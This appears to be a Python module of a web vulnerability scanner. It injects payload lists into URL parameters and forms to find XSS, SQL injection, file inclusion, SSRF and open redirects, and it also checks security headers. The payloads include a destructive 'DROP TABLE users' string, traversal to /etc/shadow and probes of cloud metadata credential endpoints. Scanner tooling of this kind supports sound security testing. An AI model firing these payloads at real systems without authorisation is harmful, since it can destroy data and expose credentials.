"""
VulnScanner — active vulnerability checks.
Modules: XSS, SQLi, LFI, SSRF, Open Redirect, Security Headers.
"""

import threading
import time
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, urlunparse
from queue import Queue
from bs4 import BeautifulSoup

from modules.utils import (
    make_session, safe_get, safe_post, finding, log, Colors
)


# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<svg onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "' AND SLEEP(3)--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:3'--",
]

SQLI_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "ora-01756",
    "unclosed quotation mark",
    "syntax error",
    "pg_query",
    "sqlite3",
    "microsoft sql server",
    "jdbc",
    "sqlstate",
    "sql server",
    "pdo",
    "you have an error in your sql",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
]

LFI_SIGNATURES = [
    "root:x:0:0",
    "[extensions]",
    "[boot loader]",
    "for 16-bit app support",
    "daemon:x:",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://169.254.169.254/metadata/v1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://127.1/",
]

SSRF_SIGNATURES = [
    "ami-id",
    "instance-id",
    "computeMetadata",
    "iam/security-credentials",
    "metadata",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%2F%2F",
    "/\\evil.com",
    "http://evil.com",
    "javascript:alert(1)",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "return", "return_to",
    "returnUrl", "next", "url", "goto", "dest", "destination",
    "continue", "forward", "target", "redir", "r", "u",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Frame-Options": "medium",
    "X-Content-Type-Options": "medium",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "X-XSS-Protection": "low",
}


# ── Scanner class ─────────────────────────────────────────────────────────────

class VulnScanner:
    def __init__(self, config: dict, recon_data: dict):
        self.config    = config
        self.recon     = recon_data
        self.timeout   = config.get("timeout", 10)
        self.threads   = config.get("threads", 10)
        self.verbose   = config.get("verbose", False)
        self.session   = make_session(config)
        self.findings  : list[dict] = []
        self._lock     = threading.Lock()

    # ── Helpers ───────────────────────────────────────────────────────────

    def _add(self, f: dict):
        """Thread-safe addition of findings."""
        with self._lock:
            self.findings.append(f)

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a query param value with a payload."""
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            new_query = urlencode(qs, doseq=True)
            return urlunparse(parsed._replace(query=new_query))
        except Exception:
            return url

    def _urls_with_params(self) -> list[str]:
        """Get URLs that have query parameters."""
        return [u for u in self.recon.get("urls", []) if "?" in u]

    def _run_threaded(self, fn, items):
        """Execute function on items using thread pool."""
        q = Queue()
        results = []
        lock = threading.Lock()
        for item in items:
            q.put(item)

        def worker():
            while not q.empty():
                try:
                    item = q.get_nowait()
                except Exception:
                    return
                try:
                    result = fn(item)
                    if result:
                        with lock:
                            results.extend(result if isinstance(result, list) else [result])
                except Exception as e:
                    log(f"  [worker] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                q.task_done()

        ts = [threading.Thread(target=worker, daemon=True) for _ in range(self.threads)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        return results

    # ── XSS ──────────────────────────────────────────────────────────────

    def scan_xss(self) -> list[dict]:
        """Scan for Reflected XSS via URL params and HTML forms."""
        findings = []

        # 1. Reflected XSS via URL query parameters
        for url in self._urls_with_params():
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in XSS_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp and payload in resp.text:
                                f = finding(
                                    "Reflected XSS",
                                    test_url,
                                    "high",
                                    f"Parameter '{param}' reflects unsanitised payload",
                                    f"Payload: {payload[:100]}"
                                )
                                self._add(f)
                                findings.append(f)
                                log(f"  [XSS] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break
                        except Exception as e:
                            log(f"  [XSS] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [XSS] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        # 2. XSS via HTML form fields
        for form in self.recon.get("forms", []):
            try:
                for field in form.get("fields", []):
                    if field.get("type") in ("hidden", "submit", "button"):
                        continue
                    for payload in XSS_PAYLOADS[:3]:
                        try:
                            data = {f["name"]: f.get("value", "test") for f in form.get("fields", [])}
                            data[field["name"]] = payload
                            
                            if form.get("method", "get").lower() == "post":
                                resp = safe_post(self.session, form.get("action", ""), data, self.timeout)
                            else:
                                form_url = form.get("action", "") + "?" + urlencode(data)
                                resp = safe_get(self.session, form_url, self.timeout)
                            
                            if resp and payload in resp.text:
                                f = finding(
                                    "Reflected XSS (Form)",
                                    form.get("action", ""),
                                    "high",
                                    f"Form field '{field['name']}' reflects unsanitised payload",
                                    f"Payload: {payload[:100]}"
                                )
                                self._add(f)
                                findings.append(f)
                                break
                        except Exception as e:
                            log(f"  [XSS Form] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [XSS Form] Error processing form: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── SQLi ─────────────────────────────────────────────────────────────

    def scan_sqli(self) -> list[dict]:
        """Scan for SQL Injection (error-based and time-based blind)."""
        findings = []

        # 1. Error-based SQL injection
        for url in self._urls_with_params():
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in SQLI_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                lower_body = resp.text.lower()
                                matched = [err for err in SQLI_ERRORS if err in lower_body]
                                if matched:
                                    f = finding(
                                        "SQL Injection",
                                        test_url,
                                        "critical",
                                        f"Parameter '{param}' triggers SQL error: {matched[0]}",
                                        f"Payload: {payload[:100]}"
                                    )
                                    self._add(f)
                                    findings.append(f)
                                    log(f"  [SQLi] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                    break
                        except Exception as e:
                            log(f"  [SQLi] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [SQLi] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        # 2. Time-based blind SQL injection
        for url in self._urls_with_params():
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params[:2]:
                    try:
                        test_url = self._inject_param(url, param, "' AND SLEEP(4)--")
                        start = time.time()
                        resp = safe_get(self.session, test_url, self.timeout + 5)
                        elapsed = time.time() - start
                        if resp and elapsed >= 4:
                            f = finding(
                                "Blind SQL Injection (Time-based)",
                                test_url,
                                "critical",
                                f"Parameter '{param}' caused ~{elapsed:.1f}s delay",
                                "Payload: ' AND SLEEP(4)--"
                            )
                            self._add(f)
                            findings.append(f)
                            log(f"  [SQLi Time] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                    except Exception as e:
                        log(f"  [SQLi Time] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                        continue
            except Exception as e:
                log(f"  [SQLi Time] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── LFI ──────────────────────────────────────────────────────────────

    def scan_lfi(self) -> list[dict]:
        """Scan for Local File Inclusion with path traversal payloads."""
        findings = []

        for url in self._urls_with_params():
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in LFI_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                body = resp.text
                                for sig in LFI_SIGNATURES:
                                    if sig in body:
                                        f = finding(
                                            "Local File Inclusion",
                                            test_url,
                                            "critical",
                                            f"Parameter '{param}' includes local file (signature: {sig!r})",
                                            f"Payload: {payload}"
                                        )
                                        self._add(f)
                                        findings.append(f)
                                        log(f"  [LFI] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                        break
                        except Exception as e:
                            log(f"  [LFI] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [LFI] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── SSRF ─────────────────────────────────────────────────────────────

    def scan_ssrf(self) -> list[dict]:
        """Scan for Server-Side Request Forgery (AWS/GCP metadata, localhost)."""
        findings = []

        for url in self._urls_with_params():
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in SSRF_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                body = resp.text
                                for sig in SSRF_SIGNATURES:
                                    if sig in body:
                                        f = finding(
                                            "Server-Side Request Forgery (SSRF)",
                                            test_url,
                                            "critical",
                                            f"Parameter '{param}' may be fetching internal resources (sig: {sig!r})",
                                            f"Payload: {payload}"
                                        )
                                        self._add(f)
                                        findings.append(f)
                                        log(f"  [SSRF] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                        break
                        except Exception as e:
                            log(f"  [SSRF] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [SSRF] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Open Redirect ─────────────────────────────────────────────────────

    def scan_open_redirect(self) -> list[dict]:
        """Scan for Open Redirect vulnerabilities on 16 common redirect parameters."""
        findings = []
        urls = self.recon.get("urls", [])

        for url in urls:
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                
                # Find redirect-like parameters in the URL
                redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
                
                # If no redirect params found, try common ones anyway
                if not redirect_params:
                    redirect_params = REDIRECT_PARAMS[:5]

                for param in redirect_params:
                    for payload in OPEN_REDIRECT_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout, allow_redirects=True)
                            
                            if resp:
                                final_url = resp.url if hasattr(resp, 'url') else ""
                                
                                # Check if evil.com is in final URL or redirect headers
                                if "evil.com" in final_url:
                                    f = finding(
                                        "Open Redirect",
                                        test_url,
                                        "medium",
                                        f"Parameter '{param}' redirects to external domain",
                                        f"Final URL: {final_url[:100]}"
                                    )
                                    self._add(f)
                                    findings.append(f)
                                    log(f"  [REDIRECT] {test_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                                    break
                                
                                # Check response history for redirects
                                if hasattr(resp, 'history'):
                                    for h in resp.history:
                                        loc = h.headers.get("Location", "")
                                        if "evil.com" in loc:
                                            f = finding(
                                                "Open Redirect",
                                                test_url,
                                                "medium",
                                                f"Parameter '{param}' redirects to external domain",
                                                f"Redirect Location: {loc[:100]}"
                                            )
                                            self._add(f)
                                            findings.append(f)
                                            log(f"  [REDIRECT] {test_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                                            break
                        except Exception as e:
                            log(f"  [REDIRECT] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [REDIRECT] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Security Headers ─────────────────────────────────────────────────

    def scan_headers(self) -> list[dict]:
        """Scan for missing security headers and version disclosure."""
        findings = []
        
        try:
            target = self.config.get("target", "")
            if not target:
                return findings
            
            resp = safe_get(self.session, target, self.timeout)
            if not resp:
                return findings

            # Check for missing security headers
            for header, severity in SECURITY_HEADERS.items():
                if header not in resp.headers:
                    f = finding(
                        "Missing Security Header",
                        target,
                        severity,
                        f"Response is missing the '{header}' header",
                        f"Headers present: {', '.join(list(resp.headers.keys())[:5])}"
                    )
                    self._add(f)
                    findings.append(f)

            # Check for overly verbose Server header (version disclosure)
            server = resp.headers.get("Server", "")
            if server and any(c.isdigit() for c in server):
                f = finding(
                    "Information Disclosure (Server Banner)",
                    target,
                    "low",
                    f"Server header reveals version: {server!r}",
                    ""
                )
                self._add(f)
                findings.append(f)
                log(f"  [HEADERS] Server banner: {server}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

            # Check for X-Powered-By (tech stack disclosure)
            x_powered = resp.headers.get("X-Powered-By", "")
            if x_powered:
                f = finding(
                    "Information Disclosure (X-Powered-By)",
                    target,
                    "low",
                    f"X-Powered-By reveals tech stack: {x_powered!r}",
                    ""
                )
                self._add(f)
                findings.append(f)
                log(f"  [HEADERS] X-Powered-By: {x_powered}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

            # Check for X-AspNet-Version (ASP.NET version disclosure)
            aspnet = resp.headers.get("X-AspNet-Version", "")
            if aspnet:
                f = finding(
                    "Information Disclosure (X-AspNet-Version)",
                    target,
                    "low",
                    f"X-AspNet-Version reveals .NET version: {aspnet!r}",
                    ""
                )
                self._add(f)
                findings.append(f)

        except Exception as e:
            log(f"  [HEADERS] Error scanning headers: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return findings

    # ── Main scan orchestration ───────────────────────────────────────────

    def run_all(self) -> list[dict]:
        """Execute all vulnerability scans."""
        try:
            log("  [scanner] Starting vulnerability scans...", Colors.CYAN, verbose_only=True, verbose=self.verbose)
            
            # Run all scans (can be parallelized if needed)
            self.scan_xss()
            self.scan_sqli()
            self.scan_lfi()
            self.scan_ssrf()
            self.scan_open_redirect()
            self.scan_headers()
            
            log(f"  [scanner] Found {len(self.findings)} vulnerabilities", Colors.CYAN, verbose_only=True, verbose=self.verbose)
            return self.findings
            
        except Exception as e:
            log(f"  [scanner] Fatal error during scanning: {e}", Colors.RED, verbose_only=True, verbose=self.verbose)
            return self.findings
